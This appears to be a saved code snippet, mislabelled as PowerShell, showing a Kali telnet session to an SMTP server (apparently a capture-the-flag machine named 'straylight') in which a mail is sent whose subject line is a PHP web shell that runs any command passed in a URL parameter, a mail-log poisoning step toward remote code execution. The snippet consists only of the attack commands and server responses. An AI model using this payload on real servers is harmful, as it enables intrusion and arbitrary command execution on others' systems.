---
id: be170b04-7f00-4bbd-9182-7ec4a97c1339
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:58.606999+00:00'
updated_at: '2023-04-10T20:22:15.238045+00:00'
---

# Code Snippet be170b04

**Language**: Powershell

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```


